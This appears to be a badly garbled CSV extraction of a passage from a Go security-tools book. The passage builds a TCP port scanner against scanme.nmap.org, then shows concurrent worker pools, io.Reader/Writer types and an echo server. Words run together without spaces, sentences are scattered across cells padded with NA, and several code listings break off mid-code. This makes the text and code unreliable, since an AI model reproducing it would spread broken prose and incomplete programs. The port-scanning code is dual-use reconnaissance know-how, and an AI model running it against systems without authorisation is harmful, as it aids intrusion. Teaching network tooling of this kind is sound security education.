"contiguousmethod;however,thiscanbecometime-",NA,NA
"consumingwhenyourgoalistoscanall65,535ports.You’ll ",NA,NA
explorehowtouseconcurrencytomakeaninefficientport ,NA,NA
scannermoresuitableforlargerport-scanningtasks.,NA,NA
You’llalsobeabletoapplytheconcurrencypatternsthat ,NA,NA
"you’lllearninthissectioninmanyotherscenarios,bothinthis ",NA,NA
bookandbeyond.,NA,NA
TestingforPortAvailability,NA,NA
Thefirststepincreatingtheportscannerisunderstandinghow ,NA,NA
toinitiateaconnectionfromaclienttoaserver.Throughout ,NA,NA
"thisexample,you’llbeconnectingtoandscanning",NA,NA
scanme.nmap.org,NA,NA
",aservicerunbytheNmapproject. Todo ",1,NA
"this,you’lluseGo’s",net,NA
package:,"net.Dial(
 network
 ,
 addressstring
 )",NA
.,NA,NA
Thefirstargumentisastringthatidentifiesthekindof ,NA,NA
connectiontoinitiate.Thisisbecause,Dial,NA
isn’tjustforTCP;it,NA,NA
"canbeusedforcreatingconnectionsthatuseUnixsockets, ",NA,NA
"UDP,andLayer4protocolsthatexistonlyinyourhead(the ",NA,NA
"authorshavebeendownthisroad,andsufficeittosay,TCPis ",NA,NA
"verygood).Thereareafewstringsyoucanprovide,butfor ",NA,NA
"thesakeofbrevity,you’llusethestring",tcp,NA
.,NA,NA
Thesecondargumenttells,"Dial(
 network
 ,
 addressstring
 )",NA
thehost,NA,NA
"towhichyouwishtoconnect.Noticeit’sasinglestring,nota ",string,NA
andan,int,NA
".ForIPv4/TCPconnections,thisstringwilltake",NA,NA
theformof,host:port,NA
".Forexample,ifyouwantedtoconnectto",NA,NA
scanme.nmap.org,NA,NA
"onTCPport80,youwouldsupply ",scanme.nmap.org:80,NA
.,NA,NA
"Nowyouknowhowtocreateaconnection,buthowwill",NA,NA
youknowiftheconnectionissuccessful?You’lldothis ,NA,NA
througherrorchecking:,"Dial(
 network
 ,
 addressstring
 )",NA
returns,Conn,NA
and,error,NA
",and",error,NA
willbe,nil,NA
"iftheconnectionissuccessful.So,to",NA,NA
"verifyyourconnection,youjustcheckwhether",error,NA
equals,nil,NA
.,NA,NA
Younowhaveallthepiecesneededtobuildasingleport ,NA,NA
"scanner,albeitanimpoliteone.",NA,NA
Listing2-1,NA,NA
showshowtoputit ,NA,NA
together.(Allthecodelistingsattherootlocationof/exist ,NA,NA
undertheprovidedgithubrepo,NA,NA
https://github.com/blackhat-,NA,NA
go/bhg/,NA,NA
.) ,"packagemain
  
  
 import(
  
 ""fmt"" 
  
 ""net""
  
 )
  
  
 funcmain(){
  
 _,err:=net.Dial(""tcp"",""scanme.nmap.org:80"") 
  
 iferr==nil{ 
  
 fmt.Println(""Connectionsuccessful"") 
  
 }
  
 }
  
 Listing2-1:Abasicportscannerthatscansonlyoneport(
 /ch-2/dial/main.go
 )",NA
Runthiscode.Youshouldsee,Connectionsuccessful,NA
",provided",NA,NA
youhaveaccesstothegreatinformationsuperhighway.,NA,NA
PerformingNonconcurrentScanning,NA,NA
"Scanningasingleportatatimeisn’tuseful,anditcertainly ",NA,NA
isn’tefficient.TCPportsrangefrom1to65535;butfor ,NA,NA
"testing,let’sscanports1to1024.Todothis,youcanusea",for,NA
loop:,fori:=1;i<=1024;i++{,NA
Nowyouhavean,int,NA
",butremember,youneedastringas",NA,NA
thesecondargumentto,"Dial(
 network
 ,
 addressstring
 )",NA
.Thereareat,NA,NA
leasttwowaystoconverttheintegerintoastring.Onewayis,NA,NA
"tousethestringconversionpackage,",strconv,NA
.Theotherwayis,NA,NA
touse,"Sprintf(
 formatstring",NA
",","a...interface
 {})",NA
fromthe,fmt,NA
"package,",NA,NA
which(similartoitsCsibling)returnsa,string,NA
generatedfroma,NA,NA
formatstring.,NA,NA
Createanewfilewiththecodein,NA,NA
Listing2-2,NA,NA
andensure,NA,NA
thatbothyourloopandstringgenerationwork.Runningthis,NA,NA
"codeshouldprint1024lines,butdon’tfeelobligatedtocount",NA,NA
them.,"packagemain
  
  
 import(
  
  
 ""fmt""
  
  
 )
  
  
 funcmain(){
  
  
 fori:=1;i<=1024;i++{
  
  
 address:=fmt.Sprintf(""scanme.nmap.org:%d"",i)
  
  
 fmt.Println(address)
  
  
 }
  
  
 }
  
 Listing2-2:Scanning1024portsof
 scanme.nmap.org
 (
 /ch-2/tcp-scanner-
  
 slow/main.go
 )",NA
Allthat’sleftistoplugtheaddressvariablefromthe,NA,NA
previouscodeexampleinto,"Dial(
 network
 ,
 addressstring
 )",NA
",and",NA,NA
implementthesameerrorcheckingfromtheprevioussection,NA,NA
totestportavailability.Youshouldalsoaddsomelogicto,NA,NA
"closetheconnectionifitwassuccessful;thatway,connections",NA,NA
aren’tleftopen.,NA,NA
FINishing,NA,NA
yourconnectionsisjustpolite.To ,NA,NA
"dothat,you’llcall",Close(),NA
on,Conn,NA
.,NA,NA
Listing2-3,NA,NA
showsthe,NA,NA
completedportscanner.,"packagemain
  
  
 import(
  
  
 ""fmt"" 
  
 ""net""
  
 )
  
  
 funcmain(){
  
 fori:=1;i<=1024;i++{ 
  
 address:=fmt.Sprintf(""scanme.nmap.org:%d"",i) 
 conn,err:=net.Dial(""tcp"",address) 
  
 iferr!=nil{ 
  
 //portisclosedorfiltered.
  
 continue 
  
 } 
  
 conn.Close() 
  
 fmt.Printf(""%dopen\n"",i) 
  
  
 }
  
 }
  
 Listing2-3:Thecompletedportscanner(
 /ch-2/tcp-scanner-slow/main.go
 )",NA
Compileandexecutethiscodetoconductalightscan,NA,NA
againstthetarget.Youshouldseeacoupleofopenports.,NA,NA
PerformingConcurrentScanning,NA,NA
Thepreviousscannerscannedmultipleportsinasinglego ,NA,NA
(punintended).Butyourgoalnowistoscanmultipleports ,NA,NA
"concurrently,whichwillmakeyourportscannerfaster.Todo",NA,NA
"this,you’llharnessthepowerofgoroutines.Gowillletyou ",NA,NA
"createasmanygoroutinesasyoursystemcanhandle,bound",NA,NA
onlybyavailablememory.,NA,NA
The“TooFast”ScannerVersion,NA,NA
Themostnaivewaytocreateaportscannerthatruns ,NA,NA
concurrentlyistowrapthecallto,"Dial(
 network
 ,
 addressstring
 )",NA
ina,NA,NA
goroutine.Intheinterestoflearningfromnatural ,NA,NA
"consequences,createanewfilecalled",NA,NA
scan-too-fast.go,NA,NA
with ,NA,NA
thecodein,NA,NA
Listing2-4,NA,NA
andexecuteit.,"packagemain
  
  
 import(
  
 ""fmt"" 
  
 ""net""
  
 )
  
  
 funcmain(){
  
 fori:=1;i<=1024;i++{ 
  
 gofunc(jint){ 
  
 address:=fmt.Sprintf(""scanme.nmap.org:%d"",j) 
 conn,err:=net.Dial(""tcp"",address) 
  
 iferr!=nil{ 
  
 return 
  
 } 
  
 conn.Close() 
  
 fmt.Printf(""%dopen\n"",j) 
  
 }(i) 
  
 }
  
 }
  
 Listing2-4:Ascannerthatworkstoofast(
 /ch-2/tcp-scanner-too-fast/main.go
 )",NA
"Uponrunningthiscode,youshouldobservetheprogram ",NA,NA
exitingalmostimmediately:,"$
 time./tcp-scanner-too-fast
  
  
 ./tcp-scanner-too-fast0.00suser0.00ssystem90%cpu0.004total",NA
Thecodeyoujustranlaunchesasinglegoroutineper ,NA,NA
"connection,andthemaingoroutinedoesn’tknowtowaitfor ",NA,NA
"theconnectiontotakeplace.Therefore,thecodecompletes ",NA,NA
andexitsassoonasthe,for,NA
"loopfinishesitsiterations,which",NA,NA
maybefasterthanthenetworkexchangeofpacketsbetween ,NA,NA
yourcodeandthetargetports.Youmaynotgetaccurate ,NA,NA
resultsforportswhosepacketswerestillin-flight.,NA,NA
Thereareafewwaystofixthis.Oneistouse,WaitGroup,NA
fromthe,sync,NA
"package,whichisathread-safewaytocontrol",NA,NA
concurrency.,WaitGroup,NA
isastructtypeandcanbecreatedlike,NA,NA
so:,varwgsync.WaitGroup,NA
Onceyou’vecreated,WaitGroup,NA
",youcancallafewmethods",NA,NA
onthestruct.Thefirstis,"Add(
 int
 )",NA
",whichincreasesaninternal",NA,NA
"counterbythenumberprovided.Next,",Done(),NA
decrementsthe,NA,NA
"counterbyone.Finally,",Wait(),NA
blockstheexecutionofthe,NA,NA
"goroutineinwhichit’scalled,andwillnotallowfurther ",NA,NA
executionuntiltheinternalcounterreacheszero.Youcan ,NA,NA
combinethesecallstoensurethatthemaingoroutinewaitsfor ,NA,NA
allconnectionstofinish.,NA,NA
SynchronizedScanningUsingWaitGroup,NA,NA
Listing2-5,NA,NA
showsthesameport-scanningprogramwitha ,NA,NA
differentimplementationofthegoroutines.,"packagemain
  
  
 import(
  
  
 ""fmt""
  
  
 ""net""",NA
Thisiterationofthecoderemainslargelyidenticaltoour ,NA,NA
"initialversion.However,you’veaddedcodethatexplicitly ",NA,NA
"trackstheremainingwork.Inthisversionoftheprogram,you ",NA,NA
create,sync.WaitGroup,NA
"❶,whichactsasasynchronizedcounter. ",NA,NA
Youincrementthiscountervia,wg.Add(1),NA
eachtimeyoucreatea ,NA,NA
"goroutinetoscanaport❷,andadeferredcallto",wg.Done(),NA
decrementsthecounterwheneveroneunitofworkhasbeen ,NA,NA
performed❸.Your,main(),NA
functioncalls,wg.Wait(),NA
",whichblocks ",NA,NA
untilalltheworkhasbeendoneandyourcounterhasreturned ,NA,NA
tozero❹.,NA,NA
"Thisversionoftheprogramisbetter,butstillincorrect.If ",NA,NA
"yourunthismultipletimesagainstmultiplehosts,youmight ",NA,NA
seeinconsistentresults.Scanninganexcessivenumberof,NA,NA
hostsorportssimultaneouslymaycausenetworkorsystem ,NA,NA
limitationstoskewyourresults.Goaheadandchange,1024,NA
to ,NA,NA
65535,NA,NA
",andthedestinationservertoyourlocalhost",NA,NA
127.0.0.1,NA,NA
i,NA,NA
"n yourcode.Ifyouwant,youcanuseWiresharkortcpdumpto ",NA,NA
seehowfastthoseconnectionsareopened.,NA,NA
PortScanningUsingaWorkerPool ,NA,NA
"Toavoidinconsistencies,you’lluseapoolofgoroutinesto ",NA,NA
managetheconcurrentworkbeingperformed.Usinga,for,NA
"loop,you’llcreateacertainnumberofworkergoroutinesasa ",NA,NA
"resourcepool.Then,inyour",main(),NA
"“thread,”you’llusea ",NA,NA
channeltoprovidework.,NA,NA
"Tostart,createanewprogramthathas100workers, ",NA,NA
consumesachannelof,int,NA
",andprintsthemtothescreen.You’ll ",NA,NA
stilluse,WaitGroup,NA
toblockexecution.Createyourinitialcode ,NA,NA
stubfora,main,NA
"function.Aboveit,writethefunctionshownin ",NA,NA
Listing2-6,NA,NA
.,"funcworker(portschanint,wg*sync.WaitGroup){
  
  
 forp:=rangeports{
  
  
 fmt.Println(p)
  
  
 wg.Done()
  
  
 }
  
  
 }
  
 Listing2-6:Aworkerfunctionforprocessingwork",NA
The,"worker(int,*sync.WaitGroup)",NA
functiontakestwoarguments:a ,NA,NA
channeloftype,int,NA
andapointertoa,WaitGroup,NA
.Thechannelwill ,NA,NA
"beusedtoreceivework,andthe",WaitGroup,NA
willbeusedtotrack ,NA,NA
whenasingleworkitemhasbeencompleted.,NA,NA
"Now,addyour",main(),NA
functionshownin,NA,NA
Listing2-7,NA,NA
",which",NA,NA
willmanagetheworkloadandprovideworktoyour,"worker(int,
  
 *sync.WaitGroup)",NA
function.,"packagemain
  
 import( 
  
 ""fmt"" 
  
 ""sync"" 
  
 )
  
 funcworker(portschanint,wg*sync.WaitGroup){
 ❶forp:=rangeports{ 
  
 fmt.Println(p)
  
 wg.Done() 
  
 } 
  
 }
  
 funcmain(){ 
  
 ports:=make❷(chanint,100) 
  
 varwgsync.WaitGroup
  
 ❸fori:=0;i<cap(ports);i++{ 
  
 goworker(ports,&wg)
  
 } 
  
 fori:=1;i<=1024;i++{
  
 wg.Add(1)
  
  
 ❹ports<-i 
  
 }
  
  
 wg.Wait()
  
 ❺close(ports
 ) 
  
 }
  
 Listing2-7:Abasicworkerpool(
 /ch-2/tcp-sync-scanner/main.go
 )",NA
"First,youcreateachannelbyusing",make(),NA
❷.Asecond ,NA,NA
"parameter,an",int,NA
valueof,100,NA
",isprovidedto",make(),NA
here.This,NA,NA
allowsthechanneltobe,NA,NA
buffered,NA,NA
",whichmeansyoucansend ",NA,NA
itanitemwithoutwaitingforareceivertoreadtheitem. ,NA,NA
Bufferedchannelsareidealformaintainingandtrackingwork,NA,NA
formultipleproducersandconsumers.You’vecappedthe ,NA,NA
"channelat100,meaningitcanhold100itemsbeforethe ",NA,NA
"senderwillblock.Thisisaslightperformanceincrease,asit ",NA,NA
willallowalltheworkerstostartimmediately.,NA,NA
"Next,youusea",for,NA
loop❸tostartthedesirednumberof ,NA,NA
"workers—inthiscase,100.Inthe","worker(int,*sync.WaitGroup)",NA
"function,youuse",range,NA
❶tocontinuouslyreceivefromthe,ports,NA
"channel,loopinguntilthechannelisclosed.Noticethatyou ",NA,NA
aren’tdoinganyworkyetintheworker—that’llcomeshortly. ,NA,NA
Iteratingovertheportssequentiallyinthe,main(),NA
"function,you ",NA,NA
sendaportonthe,ports,NA
channel❹totheworker.Afterallthe ,NA,NA
"workhasbeencompleted,youclosethechannel❺.",NA,NA
"Onceyoubuildandexecutethisprogram,you’llseeyour ",NA,NA
numbersprintedtothescreen.Youmightnoticesomething ,NA,NA
interestinghere:thenumbersareprintedinnoparticularorde,NA,NA
r. Welcometothewonderfulworldofparallelism.,NA,NA
MultichannelCommunication,NA,NA
"Tocompletetheportscanner,youcouldpluginyourcode ",NA,NA
"fromearlierinthesection,anditwouldworkjustfine.",NA,NA
"However,theprintedportswouldbeunsorted,becausethe ",NA,NA
"scannerwouldn’tchecktheminorder.Tosolvethisproblem, ",NA,NA
youneedtouseaseparatethreadtopasstheresultoftheport ,NA,NA
scanbacktoyourmainthreadtoordertheportsbefore ,NA,NA
printing.Anotherbenefitofthismodificationisthatyoucan ,NA,NA
removethedependencyofa,WaitGroup,NA
"entirely,asyou’llhave",NA,NA
"anothermethodoftrackingcompletion.Forexample,ifyou ",NA,NA
"scan1024ports,you’resendingontheworkerchannel1024 ",NA,NA
"times,andyou’llneedtosendtheresultofthatworkbackto ",NA,NA
themainthread1024times.Becausethenumberofworkunits,NA,NA
"sentandthenumberofresultsreceivedarethesame,your",NA,NA
programcanknowwhentoclosethechannelsand ,NA,NA
subsequentlyshutdowntheworkers.,NA,NA
Thismodificationisdemonstratedin,NA,NA
Listing2-8,NA,NA
",which ",NA,NA
completestheportscanner.,"packagemain
  
  
 import( 
  
   
 ""fmt"" 
  
 ""net"" 
  
 ""sort"" 
  
  
 )
  
 ❶funcworker(ports,resultschanint){ 
  
   
 forp:=rangeports{ 
  
 address:=fmt.Sprintf(""scanme.nmap.org:%d"",p) 
 conn,err:=net.Dial(""tcp"",address) 
  
 iferr!=nil{
  
     
 ❷results<-0 
  
 continue 
  
 } 
  
 conn.Close()
  
    
 ❸results<-p 
  
 } 
  
 } 
  
  
 funcmain(){
  
 ports:=make(chanint,100)
  
 ❹results:=make(chanint)
  
 ❺varopenports[]int
  
 fori:=0;i<cap(ports);i++{ 
  
 goworker(ports,results) 
  
 }
  
 ❻gofunc(){ 
  
 fori:=1;i<=1024;i++{ 
  
 ports<-i
  
 }",NA
The,"worker(ports,resultschanint)",NA
functionhasbeenmodifiedto,NA,NA
accepttwochannels❶;theremaininglogicismostlythe ,NA,NA
"same,exceptthatiftheportisclosed,you’llsendazero❷, ",NA,NA
"andifit’sopen,you’llsendtheport❸.Also,youcreatea",NA,NA
separatechanneltocommunicatetheresultsfromtheworke,NA,NA
r tothemainthread❹.Youthenuseaslice❺tostorethe,NA,NA
"resultssoyoucansortthemlater.Next,youneedtosendto ",NA,NA
theworkersinaseparategoroutine❻becausetheresult-,NA,NA
gatheringloopneedstostartbeforemorethan100itemsof,NA,NA
workcancontinue.,NA,NA
Theresult-gatheringloop❼receivesonthe,results,NA
channel,NA,NA
"1024times.Iftheportdoesn’tequal0,it’sappendedtothe ",NA,NA
"slice.Afterclosingthechannels,you’lluse",sort,NA
❽tosortthe,NA,NA
sliceofopenports.Allthat’sleftistoloopoverthesliceand,NA,NA
printtheopenportstoscreen.,NA,NA
Thereyouhaveit:ahighlyefficientportscanner.Take,NA,NA
"sometimetoplayaroundwiththecode—specifically,the ",NA,NA
"numberofworkers.Thehigherthecount,thefasteryour ",NA,NA
"programshouldexecute.Butifyouaddtoomanyworkers, ",NA,NA
yourresultscouldbecomeunreliable.Whenyou’rewriting ,NA,NA
"toolsforotherstouse,you’llwanttouseahealthydefault ",NA,NA
"valuethatcaterstoreliabilityoverspeed.However,you ",NA,NA
shouldalsoallowuserstoprovidethenumberofworkersasan ,NA,NA
option.,NA,NA
Youcouldmakeacoupleofimprovementstothisprogram. ,NA,NA
"First,you’resendingonthe",results,NA
channelforeveryport,NA,NA
"scanned,andthisisn’tnecessary.Thealternativerequirescod",NA,NA
e thatisslightlymorecomplexasitusesanadditionalchannel ,NA,NA
"notonlytotracktheworkers,butalsotopreventarace ",NA,NA
conditionbyensuringthecompletionofallgatheredresults.,NA,NA
"Asthisisanintroductorychapter,wepurposefullyleftthis ",NA,NA
out;butdon’tworry!We’llintroducethispatternin,NA,NA
Chapter3,NA,NA
. ,NA,NA
"Second,youmightwantyourscannertobeabletoparseport-",NA,NA
"strings—forexample,","80,443,8080,21-25",NA
",likethosethatcanbe",NA,NA
"passedtoNmap.Ifyouwanttoseeanimplementationofthis, ",NA,NA
see,NA,NA
https://github.com/blackhat-go/bhg/blob/master/ch-,NA,NA
2/scanner-port-format/,NA,NA
.We’llleavethisasanexerciseforyou ,NA,NA
toexplore.,NA,NA
BUILDINGATCPPROXY,NA,NA
YoucanachieveallTCP-basedcommunicationsbyusing ,NA,NA
Go’sbuilt-in,net,NA
package.Theprevioussectionfocused,NA,NA
primarilyonusingthe,net,NA
"packagefromaclient’sperspective,",NA,NA
andthissectionwilluseittocreateTCPserversandtransfer ,NA,NA
data.You’llbeginthisjourneybybuildingtherequisite,NA,NA
echo,NA,NA
server,NA,NA
—aserverthatmerelyechoesagivenresponsebacktoa ,NA,NA
client—followedbytwomuchmoregenerallyapplicable ,NA,NA
programs:aTCPportforwarderandare-,NA,NA
creationofNetcat’s“gapingsecurityhole”forremotecomman,NA,NA
dexecution.,NA,NA
Usingio.Readerandio.Writer,NA,NA
"Tocreatetheexamplesinthissection,youneedtousetwo ",NA,NA
significanttypesthatarecrucialtoessentiallyallinput/output ,NA,NA
"(I/O)tasks,whetheryou’reusingTCP,HTTP,afilesystem,or ",NA,NA
anyothermeans:,io.Reader,NA
and,io.Writer,NA
.PartofGo’sbuilt-in,io,NA
"package,thesetypesactasthecornerstonetoanydata ",NA,NA
"transmission,localornetworked.Thesetypesaredefinedin ",NA,NA
Go’sdocumentationasfollows:,"typeReaderinterface{
  
  
 Read(p[]byte)(nint,errerror)
  
  
 }
  
  
 typeWriterinterface{
  
  
 Write(p[]byte)(nint,errerror)
  
  
 }",NA
"Bothtypesaredefinedasinterfaces,meaningtheycan’tbe ",NA,NA
directlyinstantiated.Eachtypecontainsthedefinitionofa ,NA,NA
singleexportedfunction:,Read,NA
or,Write,NA
.Asexplainedin,NA,NA
Chapter,NA,NA
1,NA,NA
",youcanthinkofthesefunctionsasabstractmethodsthat ",NA,NA
mustbeimplementedonatypeforittobeconsidereda,Reader,NA
or,Writer,NA
".Forexample,thefollowingcontrivedtypefulfillsthis",NA,NA
contractandcanbeusedanywherea,Reader,NA
isaccepted:,"typeFooReaderstruct{}
  
  
 func(fooReader*FooReader)Read(p[]byte)(int,error){
  
  
 //Readsomedatafromsomewhere,anywhere.
  
  
 returnlen(dataReadFromSomewhere),nil
  
  
 }",NA
Thissameideaappliestothe,Writer,NA
interface:,"typeFooWriterstruct{}
  
  
 func(fooWriter*FooWriter)Write(p[]byte)(int,error){
  
  
 //Writedatasomewhere.
  
  
 returnlen(dataWrittenSomewhere),nil
  
  
 }",NA
Let’stakethisknowledgeandcreatesomethingsemi-,NA,NA
usable:acustom,Reader,NA
and,Writer,NA
thatwrapsstdinandstdout.,NA,NA
ThecodeforthisisalittlecontrivedsinceGo’s,os.Stdin,NA
and,os.Stdout,NA
typesalreadyactas,Reader,NA
and,Writer,NA
",butthenyou",NA,NA
wouldn’tlearnanythingifyoudidn’treinventthewheelevery,NA,NA
"nowandagain,wouldyou?",NA,NA
Listing2-9,NA,NA
"showsafullimplementation,andan",NA,NA
explanationfollows.,"packagemain
  
 import(
  
 ""fmt""
  
 ""log""
  
 ""os""
  
 )
  
 //FooReaderdefinesanio.Readertoreadfromstdin.❶
 typeFooReaderstruct{}
  
  
 //Readreadsdatafromstdin.
  
 ❷func(fooReader*FooReader)Read(b[]byte)(int,error){ 
 fmt.Print(""in>"") 
  
 returnos.Stdin.Read(b)❸
  
 }
  
  
 //FooWriterdefinesanio.WritertowritetoStdout.
 ❹typeFooWriterstruct{}",NA
Thecodedefinestwocustomtypes:,FooReader,NA
❶and ,FooWriter,NA
"❹.Oneachtype,youdefineaconcrete ",NA,NA
implementationofthe,Read([]byte),NA
function❷for,FooReader,NA
and ,NA,NA
the,Write([]byte),NA
function❺for,FooWriter,NA
".Inthiscase,both ",NA,NA
functionsarereadingfromstdin❸andwritingtostdout❻.,NA,NA
Notethatthe,Read,NA
functionsonboth,FooReader,NA
and,os.Stdin,NA
returnthelengthofdataandanyerrors.Thedataitselfis,NA,NA
copiedintothe,byte,NA
slicepassedtothefunction.Thisis,NA,NA
consistentwiththe,Reader,NA
interfaceprototypedefinition,NA,NA
providedearlierinthissection.The,main(),NA
functioncreatesthat ,NA,NA
slice(named,input,NA
)❼andthenproceedstouseitincallsto ,FooReader.Read([]byte),NA
❽and,FooReader.Write([]byte),NA
❾.,NA,NA
Asamplerunoftheprogramproducesthefollowing:,"$
 gorunmain.go
  
  
 in>
 helloworld!!!
  
  
 Read15bytesfromstdin
  
  
 out>
 helloworld!!!
  
  
 Wrote4096bytestostdout",NA
Copyingdatafroma,Reader,NA
toa,Writer,NA
isafairlycommon,NA,NA
pattern—somuchsothatGo’s,io,NA
packagecontainsa,Copy(),NA
functionthatcanbeusedtosimplifythe,main(),NA
function.The,NA,NA
functionprototypeisasfollows:,"funcCopy(dstio.Writer,srcio.Reader)(writtenint64,error)",NA
Thisconveniencefunctionallowsyoutoachievethesame,NA,NA
"programmaticbehaviorasbefore,replacingyour",main(),NA
functionwiththecodein,NA,NA
Listing2-10,NA,NA
.,"funcmain(){
  
  
 var(
  
  
 readerFooReader
  
  
 writerFooWriter
  
  
 ) 
  
 if_,err:=io.Copy(&writer,&reader)❶;err!=nil{ 
 log.Fatalln(""Unabletoread/writedata"")
  
  
 }",NA
Noticethattheexplicitcallsto,reader.Read([]byte),NA
and,writer.Write([]byte),NA
havebeenreplacedwithasinglecallto ,"io.Copy(writer,reader)",NA
"❶.Underthecovers,","io.Copy(writer,reader)",NA
calls ,NA,NA
the,Read([]byte),NA
"functionontheprovidedreader,triggeringthe",FooReader,NA
"toreadfromstdin.Subsequently,","io.Copy(writer,reader)",NA
callsthe,Write([]byte),NA
"functionontheprovidedwriter,resulting",NA,NA
inacalltoyour,FooWriter,NA
",whichwritesthedatatostdout.",NA,NA
"Essentially,","io.Copy(writer,reader)",NA
handlesthesequentialread-then-,NA,NA
writeprocesswithoutallthepettydetails.,NA,NA
Thisintroductorysectionisbynomeansacomprehensive ,NA,NA
lookatGo’sI/Oandinterfaces.Manyconveniencefunctions ,NA,NA
andcustomreadersandwritersexistaspartofthestandardGo ,NA,NA
"packages.Inmostcases,Go’sstandardpackagescontainall ",NA,NA
thebasicimplementationstoachievethemostcommontasks.,NA,NA
"Inthenextsection,let’sexplorehowtoapplythese ",NA,NA
"fundamentalstoTCPcommunications,eventuallyusingthe ",NA,NA
"powervestedinyoutodevelopreal-life,usabletools.",NA,NA
CreatingtheEchoServer,NA,NA
"Asiscustomaryformostlanguages,you’llstartbybuildingan ",NA,NA
echoservertolearnhowtoreadandwritedatatoandfroma ,NA,NA
"socket.Todothis,you’lluse",net.Conn,NA
",Go’sstream-oriented",NA,NA
"networkconnection,whichweintroducedwhenyoubuilta ",NA,NA
"portscanner.BasedonGo’sdocumentationforthedatatype, ",Conn,NA
implementsthe,Read([]byte),NA
and,Write([]byte),NA
functionsas,NA,NA
definedforthe,Reader,NA
and,Writer,NA
"interfaces.Therefore,",Conn,NA
is,NA,NA
botha,Reader,NA
anda,Writer,NA
"(yes,thisispossible).Thismakes",NA,NA
"senselogically,asTCPconnectionsarebidirectionalandcan",NA,NA
beusedtosend(write)orreceive(read)data.,NA,NA
Aftercreatinganinstanceof,Conn,NA
",you’llbeabletosend",NA,NA
"andreceivedataoveraTCPsocket.However,aTCPserver ",NA,NA
can’tsimplymanufactureaconnection;aclientmustestablish ,NA,NA
"aconnection.InGo,youcanuse","net.Listen(
 network
 ,
 addressstring
 )",NA
to,NA,NA
firstopenaTCPlisteneronaspecificport.Onceaclient ,NA,NA
"connects,the",Accept(),NA
methodcreatesandreturnsa,Conn,NA
object,NA,NA
thatyoucanuseforreceivingandsendingdata.,NA,NA
Listing2-11,NA,NA
showsacompleteexampleofaserver,NA,NA
implementation.We’veincludedcommentsinlineforclarity. ,NA,NA
"Don’tworryaboutunderstandingthecodeinitsentirety,as ",NA,NA
we’llbreakitdownmomentarily.,"packagemain
  
 import( 
  
 ""log"" 
  
 ""net"" 
  
 )
  
 //echoisahandlerfunctionthatsimplyechoesreceiveddata. 
 funcecho(connnet.Conn){ 
  
 deferconn.Close()
  
 //Createabuffertostorereceiveddata.
  
 b:=make([]byte,512)
  
 ❶for{ 
  
 //Receivedataviaconn.Readintoabuffer.
  
 size,err:=conn.Read❷(b[0:]) 
  
 iferr==io.EOF{
  
 log.Println(""Clientdisconnected"") 
  
 break 
  
 } 
  
 iferr!=nil{
  
 log.Println(""Unexpectederror"")",NA
Listing2-11,NA,NA
beginsbydefiningafunctionnamed ,echo(net.Conn),NA
",whichacceptsa",Conn,NA
instanceasaparameter.It,NA,NA
behavesasaconnectionhandlertoperformallnecessaryI/O. ,NA,NA
"Thefunctionloopsindefinitely❶,usingabuffertoread❷an",NA,NA
dwrite❸datafromandtotheconnection.Thedataisread ,NA,NA
intoavariablenamed,b,NA
andsubsequentlywrittenbackonthe,NA,NA
connection.,NA,NA
Nowyouneedtosetupalistenerthatwillcallyour ,NA,NA
"handler.Asmentionedpreviously,aservercan’tmanufactur",NA,NA
e aconnectionbutmustinsteadlistenforaclienttoconnect.,NA,NA
"Therefore,alistener,definedas",tcp,NA
"boundtoport20080,is",NA,NA
startedonallinterfacesbyusingthe,"net.Listen(
 network
 ,
 address 
 string
 )",NA
function❹.,NA,NA
"Next,aninfiniteloop❺ensuresthattheserverwill ",NA,NA
continuetolistenforconnectionsevenafteronehasbeen ,NA,NA
"received.Withinthisloop,youcall",listener.Accept(),NA
"❻,afunction ",NA,NA
thatblocksexecutionasitawaitsclientconnections.Whena ,NA,NA
"clientconnects,thisfunctionreturnsa",Conn,NA
instance.Recall,NA,NA
fromearlierdiscussionsinthissectionthat,Conn,NA
isbotha,Reader,NA
anda,Writer,NA
(itimplementsthe,Read([]byte),NA
and,Write([]byte),NA
interfacemethods).,NA,NA
The,Conn,NA
instanceisthenpassedtothe,echo(net.Conn),NA
handler ,NA,NA
function❼.Thiscallisprefacedwiththe,go,NA
"keyword,making ",NA,NA
itaconcurrentcallsothatotherconnectionsdon’tblockwhile ,NA,NA
waitingforthehandlerfunctiontocomplete.Thisislikely ,NA,NA
"overkillforsuchasimpleserver,butwe’veincludeditagain ",NA,NA
"todemonstratethesimplicityofGo’sconcurrencypattern,in ",NA,NA
"caseitwasn’talreadyclear.Atthispoint,youhavetwo ",NA,NA
lightweightthreadsrunningconcurrently:,"Themainthreadloopsbackandblocksonlistener.Accept()whileitawaits 
  
 anotherconnection.
  
  
 Thehandlergoroutine,whoseexecutionhasbeentransferredtothe 
  
 echo(net.Conn)function,proceedstorun,processingthedata.",NA
ThefollowingshowsanexampleusingTelnetasthe ,NA,NA
connectingclient:,NA,NA
Theserverproducesthefollowingstandardoutput:,"$
 gorunmain.go
  
  
 2020/01/0106:22:09Listeningon0.0.0.0:20080
  
  
 2020/01/0106:22:14Receivedconnection
  
  
 2020/01/0106:22:18Received25bytes:testoftheechoserver
  
  
 2020/01/0106:22:18Writingdata",NA
"Revolutionary,right?Aserverthatrepeatsbacktothe",NA,NA
clientexactlywhattheclientsenttotheserver.Whatauseful,NA,NA
andexcitingexample!It’squiteatimetobealive.,NA,NA
ImprovingtheCodebyCreatingaBufferedListener,NA,NA
Theexamplein,NA,NA
Listing2-11,NA,NA
worksperfectlyfinebutrelieson,NA,NA
"fairlylow-levelfunctioncalls,buffertracking,anditerative",NA,NA
"reads/writes.Thisisasomewhattedious,error-proneprocess.",NA,NA
"Fortunately,Gocontainsotherpackagesthatcansimplifythis",NA,NA
"processandreducethecomplexityofthecode.Specifically,",NA,NA
the,bufio,NA
packagewraps,Reader,NA
and,Writer,NA
tocreateabufferedI/O,NA,NA
mechanism.Theupdated,echo(net.Conn),NA
"functionisdetailedhere,",NA,NA
andanexplanationofthechangesfollows:,"funcecho(connnet.Conn){
  
  
 deferconn.Close()
  
  
 ❶reader:=bufio.NewReader(conn) 
 s,err:=reader.ReadString('\n')❷
  
 iferr!=nil{",NA
Nolongerareyoudirectlycallingthe,Read([]byte),NA
and ,Write([]byte),NA
functionsonthe,Conn,NA
"instance;instead,you’re ",NA,NA
initializinganewbuffered,Reader,NA
and,Writer,NA
via ,"NewReader(
 io.Reader
 )",NA
❶and,"NewWriter(
 io.Writer
 )",NA
❸.Thesecallsboth ,NA,NA
"take,asaparameter,anexisting",Reader,NA
and,Writer,NA
"(remember, ",NA,NA
the,Conn,NA
typeimplementsthenecessaryfunctionstobe ,NA,NA
consideredbotha,Reader,NA
anda,Writer,NA
